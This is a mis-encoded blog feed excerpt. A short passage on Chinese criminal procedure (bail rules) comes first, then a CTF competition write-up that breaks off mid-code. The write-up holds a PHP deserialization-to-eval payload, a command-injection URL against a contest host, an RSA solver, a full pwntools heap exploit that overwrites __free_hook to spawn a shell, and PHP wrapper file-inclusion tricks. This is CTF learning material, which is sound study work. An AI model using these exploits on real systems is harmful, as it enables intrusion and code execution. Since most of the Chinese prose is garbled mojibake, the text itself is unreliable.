åº”å½“åœ¨çŠ¯ç½ªå«Œç–‘äººçš„å·¥ä½œå•ä½æ‰€åœ¨åœ°çš„å¸‚ã€å¿è¿›è¡Œï¼›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥åœ¨çŠ¯ç½ªå«Œç–‘äººçš„æˆ·ç±åœ°æˆ–è€…å±…ä½åœ°æ‰€åœ¨çš„å¸‚ã€å¿å†…è¿›è¡Œã€‚</li></ul><h2 id="å–ä¿å€™å®¡">å–ä¿å€™å®¡<a class="post-anchor" href="#å–ä¿å€™å®¡"></a></h2><ol><li><p>ã€Šåˆ‘è¯‰æ³•ã€‹ç¬¬å…­åä¸ƒæ¡è§„å®šï¼šäººæ°‘æ³•é™¢ã€äººæ°‘æ£€å¯Ÿé™¢å’Œå…¬å®‰æœºå…³å¯¹æœ‰ä¸‹åˆ—æƒ…å½¢ä¹‹ä¸€çš„çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººï¼Œå¯ä»¥å–ä¿å€™å®¡ï¼š</p><p>1ã€å¯èƒ½åˆ¤å¤„ç®¡åˆ¶ã€æ‹˜å½¹æˆ–è€…ç‹¬ç«‹é€‚ç”¨é™„åŠ åˆ‘çš„ï¼›</p><p>2ã€å¯èƒ½åˆ¤å¤„æœ‰æœŸå¾’åˆ‘ä»¥ä¸Šåˆ‘ç½šï¼Œé‡‡å–å–ä¿å€™å®¡ä¸è‡´å‘ç”Ÿç¤¾ä¼šå±é™©æ€§çš„ï¼›</p><p>3ã€ä¾æ³•åº”å½“é€®æ•ï¼Œä½†å› æ‚£æœ‰ä¸¥é‡ç–¾ç—…ï¼Œæˆ–æ˜¯æ­£åœ¨æ€€å­•ã€å“ºä¹³è‡ªå·±å©´å„¿çš„å¦‡å¥³ï¼Œä¸å®œé€®æ•çš„ï¼›</p><p>4ã€å¯¹å·²è¢«ä¾æ³•æ‹˜ç•™çš„çŠ¯ç½ªå«Œç–‘äººï¼Œç»è¿‡è®¯é—®ã€å®¡æŸ¥ï¼Œè®¤ä¸ºéœ€è¦é€®æ•ä½†è¯æ®ä¸è¶³çš„ï¼›</p><p>5ã€å·²è¢«é€®æ•ç¾æŠ¼çš„çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººï¼Œåœ¨æ³•å®šçš„ä¾¦æŸ¥ç¾æŠ¼ã€å®¡æŸ¥èµ·è¯‰ã€ä¸€å®¡ã€äºŒå®¡æœŸé™å†…ä¸èƒ½ç»“æ¡ˆï¼Œé‡‡å–å–ä¿å€™å®¡æ–¹æ³•æ²¡æœ‰ç¤¾ä¼šå±å®³æ€§çš„ï¼›</p><p>6ã€å¯¹æŒæœ‰æœ‰æ•ˆæŠ¤ç…§æˆ–è€…å…¶å®ƒæœ‰æ•ˆå‡ºå¢ƒè¯ä»¶ï¼Œå¯èƒ½å‡ºå¢ƒé€ƒé¿ä¾¦æŸ¥ï¼Œä½†ä¸éœ€è¦é€®æ•çš„çŠ¯ç½ªå«Œç–‘äººï¼›</p><p>7ã€æè¯·æ‰¹å‡†é€®æ•åï¼Œæ£€å¯Ÿæœºå…³ä¸æ‰¹å‡†é€®æ•ï¼Œéœ€è¦å¤è®®ã€å¤æ ¸çš„ï¼›</p><p>8ã€ç§»é€èµ·è¯‰åï¼Œæ£€å¯Ÿæœºå…³å†³å®šä¸èµ·è¯‰ï¼Œéœ€è¦å¤è®®ã€å¤æ ¸çš„ã€‚</p></li></ol><blockquote><p><a href="https://www.baidu.com/s?wd=å…¬å®‰éƒ¨&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">å…¬å®‰éƒ¨</a><a href="https://www.baidu.com/s?wd=ã€Šè§„å®šã€‹&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">ã€Šè§„å®šã€‹</a>ç¬¬64æ¡è§„å®šï¼šå¯¹ç´¯çŠ¯ã€<a href="https://www.baidu.com/s?wd=çŠ¯ç½ªé›†å›¢&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">çŠ¯ç½ªé›†å›¢</a>çš„ä¸»çŠ¯ï¼Œä»¥è‡ªä¼¤ã€è‡ªæ®‹åŠæ³•é€ƒé¿ä¾¦æŸ¥çš„çŠ¯ç½ªå«Œç–‘äººï¼Œå±å®³å›½å®¶å®‰å…¨çš„çŠ¯ç½ªã€<a href="https://www.baidu.com/s?wd=æš´åŠ›çŠ¯ç½ª&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">æš´åŠ›çŠ¯ç½ª</a>ï¼Œä»¥åŠå…¶ä»–ä¸¥é‡çŠ¯ç½ªçš„çŠ¯ç½ªå«Œç–‘äººï¼Œä¸å¾—å–ä¿å€™å®¡ã€‚</p></blockquote><p>å–ä¿å€™å®¡çš„ä¿è¯äººå¿…é¡»ç¬¦åˆä»¥ä¸‹æ¡ä»¶ï¼š</p><p>(1)ä¸æœ¬æ¡ˆæ— ç‰µè¿ï¼Œä¸å¾—æ˜¯æœ¬æ¡ˆçš„åŒæ¡ˆçŠ¯ï¼Œä¹Ÿä¸å¾—æ˜¯æœ¬æ¡ˆçš„è¯äººã€‚</p><p>(2)æœ‰èƒ½åŠ›å±¥è¡Œä¿è¯ä¹‰åŠ¡ã€‚é¡»å¹´æ»¡18å‘¨å²ä¸”ç²¾ç¥å¥å…¨ï¼Œèƒ½å¤Ÿå¯¹çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººèµ·åˆ°ç®¡åˆ¶ã€çº¦æŸä½œç”¨ï¼Œä¿è¯å…¶ä¸é€ƒé¿æ¥å—ä¾¦æŸ¥ã€èµ·è¯‰å’Œå®¡åˆ¤å¹¶éšä¼ éšåˆ°ï¼Œè¦èƒ½å¤ŸååŠ©å®Œæˆåˆ‘äº‹è¯‰è®¼ä»»åŠ¡ã€‚</p><p>(3)äº«æœ‰æ”¿æ²»æƒåˆ©ï¼Œäººèº«è‡ªç”±æœªå—åˆ°é™åˆ¶ã€‚</p><p>(4)æœ‰å›ºå®šçš„ä½å¤„å’Œæ”¶å…¥ã€‚</p><p><strong>ä¿è¯é‡‘çš„æ•°é¢</strong></p><ol><li>åº”å½“æ ¹æ®å½“åœ°çš„ç»æµå‘å±•æ°´å¹³ã€çŠ¯ç½ªå«Œç–‘äººçš„ç»æµçŠ¶å†µä»¥åŠæ¡ˆä»¶çš„æ€§è´¨ã€æƒ…èŠ‚ã€ç¤¾ä¼šå±å®³æ€§ä»¥åŠå¯èƒ½åˆ¤å¤„åˆ‘ç½šçš„è½»é‡ç­‰æƒ…å†µï¼Œç»¼åˆè€ƒè™‘ç¡®å®šã€‚</li><li>å¯¹ç»æµçŠ¯ç½ªã€ä¾µçŠ¯è´¢äº§çŠ¯ç½ªæˆ–è€…å…¶ä»–é€ æˆè´¢äº§æŸå¤±çš„çŠ¯ç½ªï¼Œå¯ä»¥æŒ‰æ¶‰æ¡ˆæ•°æ®æˆ–è€…ç›´æ¥è´¢äº§æŸå¤±æ•°é¢çš„ä¸€è‡³ä¸‰å€ç¡®å®šæ”¶å–ä¿è¯é‡‘çš„æ•°é¢æ ‡å‡†</li><li>å¯¹å…¶ä»–åˆ‘äº‹çŠ¯ç½ªï¼Œæ ¹æ®æ¡ˆä»¶çš„ä¸åŒæƒ…å†µï¼Œä¿è¯é‡‘çš„æ•°é¢æ ‡å‡†å¯ä»¥ç¡®å®šåœ¨2000å…ƒä»¥ä¸Š50000å…ƒä»¥ä¸‹ã€‚</li></ol><h2 id="ç›‘è§†å±…ä½">ç›‘è§†å±…ä½<a class="post-anchor" href="#ç›‘è§†å±…ä½"></a></h2><ol><li>ã€Šåˆ‘è¯‰æ³•ã€‹ç¬¬ä¸ƒåä¸‰æ¡ ç›‘è§†å±…ä½åº”å½“åœ¨çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººçš„ä½å¤„æ‰§è¡Œï¼›æ— å›ºå®šä½æ‰€çš„ï¼Œå¯ä»¥åœ¨æŒ‡å®šçš„å±…æ‰€æ‰§è¡Œã€‚å¯¹äºæ¶‰å«Œå±å®³å›½å®¶å®‰å…¨çŠ¯ç½ªã€ææ€–æ´»åŠ¨çŠ¯ç½ªã€ç‰¹åˆ«é‡å¤§è´¿èµ‚çŠ¯ç½ªï¼Œåœ¨ä½å¤„æ‰§è¡Œå¯èƒ½æœ‰ç¢ä¾¦æŸ¥çš„ï¼Œç»ä¸Šä¸€çº§äººæ°‘æ£€å¯Ÿé™¢æˆ–è€…å…¬å®‰æœºå…³æ‰¹å‡†ï¼Œä¹Ÿå¯ä»¥åœ¨æ‰§è¡Œçš„å±…æ‰€æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œä¸å¾—åœ¨ç¾æŠ¼åœºæ‰€ã€ä¸“é—¨çš„åŠæ¡ˆåœºæ‰€æ‰§è¡Œã€‚</li></ol><h2 id="æ‹˜ç•™">æ‹˜ç•™<a class="post-anchor" href="#æ‹˜ç•™"></a></h2><h2 id="é€®æ•">é€®æ•<a class="post-anchor" href="#é€®æ•"></a></h2>]]></content>
      
      
      <categories>
          
          <category> sdpc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ‘äº‹è¯‰è®¼æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å››å­£CTFç­”é¢˜èµ›write up</title>
      <link href="/2019/12/24/%E7%AC%AC%E5%9B%9B%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/"/>
      <url>/2019/12/24/%E7%AC%AC%E5%9B%9B%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="day1">day1<a class="post-anchor" href="#day1"></a></h1><h2 id="web">web<a class="post-anchor" href="#web"></a></h2><p>å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œphpä¼ªåè®®è¯»åˆ°user.php çš„æºç </p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1ga7miplyb2j31js0r6aeq.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga7miplyb2j31js0r6aeq.jpg" alt></a></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">convent</span></span>&#123;<span class="hljs-keyword">var</span> $warn = <span class="hljs-string">"No hacker."</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;warn);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">foreach</span>(get_object_vars(<span class="hljs-keyword">$this</span>) <span class="hljs-keyword">as</span> $k =&gt; $v) &#123;<span class="hljs-keyword">$this</span>-&gt;$k = <span class="hljs-keyword">null</span>;&#125;&#125;&#125;$cmd = $_POST[cmd];unserialize($cmd);<span class="hljs-meta">?&gt;</span></code></pre><p>è¿è¡Œ</p><pre><code class="hljs php">$exp = <span class="hljs-keyword">new</span> convent();$exp -&gt; warn = <span class="hljs-string">"system('ls');"</span>;$flag = serialize($exp);print_r($flag)</code></pre><p><code>O:7:&quot;convent&quot;:1:{s:4:&quot;warn&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;}</code></p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1ga7n4lfok8j31je0rkn0v.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga7n4lfok8j31je0rkn0v.jpg" alt></a></p><p>flag{qishinizhixuyaocaidaozhegewenjiandemingzijiuxingle}</p><h2 id="misc">misc<a class="post-anchor" href="#misc"></a></h2><p>steglove</p><p>lsb éšå†™</p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9axui6tj315w0u016i.jpg" data-caption="image-20191226173326911" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9axui6tj315w0u016i.jpg" alt="image-20191226173326911"></a></p><p>flag{test123}</p><h2 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h2><p>ä¸€ä¸ªé­”æ”¹base åŠ  å¼‚æˆ–</p><pre><code class="hljs python">key = <span class="hljs-string">""</span>data = [<span class="hljs-number">0x59</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x3</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(data)):key+=chr(data[i]^<span class="hljs-number">3</span>)<span class="hljs-keyword">print</span> key<span class="hljs-comment">#coding=utf8</span><span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> base64STANDARD_ALPHABET = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>CUSTOM_ALPHABET = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^*(+/="</span>ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET,CUSTOM_ALPHABET)DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET,STANDARD_ALPHABET)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(input)</span>:</span>  <span class="hljs-keyword">return</span> base64.b64decode(input.translate(DECODE_TRANS))flag = decode(key)<span class="hljs-keyword">print</span> flag</code></pre><p>flag{base_f4ck_Reverse}</p><h1 id="day2">day2<a class="post-anchor" href="#day2"></a></h1><h2 id="web-1">web<a class="post-anchor" href="#web-1"></a></h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>    show_source(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;    $a = @$_REQUEST[<span class="hljs-string">'hello'</span>];    $seed = @$_REQUEST[<span class="hljs-string">'seed'</span>];    $key = @$_REQUEST[<span class="hljs-string">'key'</span>];    mt_srand($seed);    $true_key = mt_rand();    <span class="hljs-keyword">if</span> ($key == $true_key)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Key Confirm"</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Key Error"</span>);    &#125;    <span class="hljs-keyword">eval</span>( <span class="hljs-string">"var_dump($a);"</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>é¢„æµ‹éšæœºæ•°</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    show_source(<span class="hljs-keyword">__FILE__</span>);    $seed = <span class="hljs-number">123456</span>;    $key = @$_REQUEST[<span class="hljs-string">'key'</span>];    mt_srand($seed);    $true_key = mt_rand();    <span class="hljs-keyword">echo</span> $true_key;<span class="hljs-meta">?&gt;</span></code></pre><p>æœ€åé—­åˆvar_dump æ‹¿åˆ°flag</p><p><code>payload = http://120.55.43.255:27189/?seed=123456&amp;key=1863022934&amp;hello=1);system(&#39;ls&#39;</code></p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa937iqahj316t0u0qjn.jpg" data-caption="image-20191226172557097" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa937iqahj316t0u0qjn.jpg" alt="image-20191226172557097"></a></p><p>flag{Y0u_Solv3_s4mpl3â€¦oNc3_Mor3}</p><h2 id="rsa">rsa<a class="post-anchor" href="#rsa"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnume=<span class="hljs-number">65537</span>n=<span class="hljs-number">444511907374811621333864968430251419855347882081695888904531795366857517417289716213363408137550866409163408633679685635315881237914815762134949770798439327373469286675370381115822381092997433491238495970527484356127131132345893007368069814286822931047915482947544230741924674880304607902413527794657556174021361113759962742306966643629644800759209829893438222447478882663573891473386520138017997195362559918730232709719486847337248425121547893862458228964360472119045154255446606447184782930767120924229261090464514045697735201016333117579385787597262783543886217220299959364476125167328883418109849139384318692440116746717156025869399990008034002881758452936213924306428955442475834311604905905260723607788504332389824348292286402781474054375184928462870240017012586229806658850881803134678565293180207556731290044948846308165695896369703720482941116135445836684836990286418102640883844706122407701782360072256987197118468391662366105964629786899281484884877640733549203394680006068637251717623691598753570260479050407069262236583726905151495550801274277155039839844872050380772537409714164680083539118124646217833871816488578092001365486400242215564766336041803413006183310354910820598373905617564797817421231716827155927723376783</span>dp=<span class="hljs-number">20688083194401098183398626094352469308150523583583104270723199988926694776131531953207031668652408481119466919329893607763657623952024909876740067584191851505244658377465365020503008072292716279306615911408934182303357474341329766407852983275790499225322862499664901633190925232802162977135254216707834894816730529759991634343322039528413883937752397011466779521590767711786777317159161700645318091278528395252576086979838790917201179739657819356771788743301669430631157222234922010934163688512789947321007479617996170289230676037655762865962020063056831019134814970048718940037920888121806608032574204482673114726401</span>c=<span class="hljs-number">378245912689862819668716257795108255336928883693984263805908702337591160408234974716356292413190786704878880742998101926728409825216339197208512929079484687018187263522243781958701468849915372674337274640196043362477406890622345686503512151501592397926764442945655423801602100185867239106836704835215686246083812117439685990637352246191517010645343417283169123105697782747026231044064639955374854873089604766677942725374108213749982052985866259433900255218180285975477045323647923881322428349632056484406017564586481848442834247385904402824072352354677823823078646874632195128328299942128116508251564811923564362991466660005438580449558184197006623490303413636461137434703925564785299335803341222051570131842042120923719184091689629809380828306649702440460761848154682611972768099340896995546188526274235118488618951865589050087434162728116205149188555273127955536588551565951618535230908129965250151258048934985977493740897420718340268536363763127676899114219828753570040978640121185354431884041597851910784347040946251752577201426797684912671641470307249794269755972278013107831885544781029384256069586713714201822683071958299038410102821213570933652719191413490563464823296852894960994148922867149263897530215474500564443133161527</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">65538</span>):    <span class="hljs-keyword">if</span> (dp*e<span class="hljs-number">-1</span>)%i == <span class="hljs-number">0</span>:        <span class="hljs-keyword">if</span> n%(((dp*e<span class="hljs-number">-1</span>)/i)+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:            p=((dp*e<span class="hljs-number">-1</span>)/i)+<span class="hljs-number">1</span>            q=n/(((dp*e<span class="hljs-number">-1</span>)/i)+<span class="hljs-number">1</span>)            phi = (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)            d = gmpy2.invert(e,phi)%phi            <span class="hljs-keyword">print</span> libnum.n2s(pow(c,d,n))</code></pre><p>flag{R_s_a_1s_Funny!!}</p><h2 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h2><p>æœ¬æ¥æ‰¾åˆ°ä¸€ä¸ªç›¸ä¼¼çš„<a href="https://x3h1n.github.io/2019/10/04/KCTF-Q3-PWN/" target="_blank" rel="noopener">é¢˜ç›®</a>ï¼Œåˆ©ç”¨ IO_FILE</p><p>ä½†æ˜¯è¿™ä¸ªé¢˜ç›®åªé™åˆ¶ä¿®æ”¹ __molloc_hook å¹¶æ²¡æœ‰é™åˆ¶free_hook</p><ol><li>leak libc</li><li>å†™sizeè¿›main_arena</li><li>ç”³è¯·åˆ°main_arenaçš„chunk</li><li>æ”¹å†™<strong>top_chunkåˆ°</strong>free_hooké™„è¿‘</li><li>addå¤šæ¬¡ï¼Œä»è€Œè®©<strong>top_chunkæŒ‡å‘</strong>free_hook</li><li>ç”³è¯·åˆ°ä¸€ä¸ªchunkï¼Œchunkåœ°å€æ˜¯__free_hookï¼ˆæˆ–é™„è¿‘ï¼‰</li><li>æ”¹å†™__free_hook</li><li>getshell</li></ol><p>æ³¨æ„ï¼šåœ¨[ ``__free_hook-0x50<code>,</code> __free_hook`]è¿™ä¸ªåŒºé—´å†…ï¼ˆå¤§æ¦‚ï¼‰ï¼Œæ˜¯ä¸èƒ½æ”¹å†™çš„ï¼ˆæˆ–è€…è¯´åªèƒ½å†™å…¥\x00ï¼‰ï¼Œå¦‚æœæ”¹å†™äº†çš„è¯å¯èƒ½ä¼šå¯¼è‡´ç¨‹åºçš„ç¼“å†²åŒºè¢«ç ´å</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> syscontext.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]file_name = <span class="hljs-string">'./heap'</span>libc_name = <span class="hljs-string">'../libc/18-libc64.so'</span>ip = <span class="hljs-string">'120.55.43.255'</span>port = <span class="hljs-string">'12240'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:p = process(file_name)elf = ELF(file_name)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="hljs-keyword">else</span>:p = remote(ip,int(port))elf = ELF(file_name)libc = ELF(<span class="hljs-string">"../libc/18-libc64.so"</span>)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">": "</span>,str(size))p.sendafter(<span class="hljs-string">": "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">": "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"3"</span>)<span class="hljs-comment"># leak libc</span>add(<span class="hljs-number">0x88</span>,<span class="hljs-string">"\x11"</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x22"</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x88</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#0</span>show()p.recvuntil(<span class="hljs-string">"0 : aaaaaaaa"</span>)libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)one_gg = <span class="hljs-number">0x4526a</span> + libc.addressadd(<span class="hljs-number">0x48</span>,<span class="hljs-string">"\x33"</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x48</span>,<span class="hljs-string">"\x33"</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x55"</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\x44"</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\x44"</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"/bin/sh\x00"</span>) <span class="hljs-comment">#7</span>free(<span class="hljs-number">4</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x22"</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">"\xa1"</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)target = <span class="hljs-number">0x3c4b4d</span> + libc.addressadd(<span class="hljs-number">0x98</span>,<span class="hljs-string">"2"</span>*<span class="hljs-number">0x48</span>+p64(<span class="hljs-number">0x51</span>)+p64(target)) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x48</span>,<span class="hljs-string">"1"</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">"\xe1"</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">6</span>)target2 = <span class="hljs-number">0x3c4b3d</span> + libc.addressadd(<span class="hljs-number">0xd8</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x71</span>)+p64(target2)) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\n"</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"1"</span>*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]<span class="hljs-number">-0xb58</span>)) <span class="hljs-comment">#6</span>li(<span class="hljs-string">"free hook"</span>,libc.symbols[<span class="hljs-string">'__free_hook'</span>])add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"1"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"2"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"3"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#9</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"4"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#10</span>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"5"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#11</span>add(<span class="hljs-number">0x100</span><span class="hljs-number">-0x20</span>,<span class="hljs-string">"\n"</span>)add(<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">1</span>)+p64(one_gg))free(<span class="hljs-number">0</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><p>flag{8c8q7t4h-jllm-izsh-9mku-d691r57eu0ly}</p><h1 id="day3">day3<a class="post-anchor" href="#day3"></a></h1><h2 id="Web1">Web1<a class="post-anchor" href="#Web1"></a></h2><p>é¢˜ç›®ç»™å‡ºæºç </p><pre><code class="hljs php">$user = $_GET[<span class="hljs-string">"user"</span>];$file = $_GET[<span class="hljs-string">"file"</span>];$pass = $_GET[<span class="hljs-string">"pass"</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"admin"</span>))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello admin!&lt;br&gt;"</span>;    <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//class.php</span>&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are not admin ! "</span>;&#125;</code></pre><p>è¿™ä¸ªé¢˜ç›®é¦–å…ˆè¦çªç ´çš„æ˜¯ï¼š<br><code>if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;the user is admin&quot;))</code><br>è®©file_get_contents($user,â€™râ€™)===â€adminâ€<br>ç”¨phpçš„å°è£…åè®®php://inputï¼Œå› ä¸ºphp://inputå¯ä»¥å¾—åˆ°åŸå§‹çš„postæ•°æ®ï¼š</p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9gsy737j31870u0dl4.jpg" data-caption="image-20191226173903523" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9gsy737j31870u0dl4.jpg" alt="image-20191226173903523"></a><p>file=php://filter/convert.base64-encode/resource=class.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(E_ALL &amp; ~E_NOTICE);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span></span>&#123;<span class="hljs-comment">//fffffflag.php</span>    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span 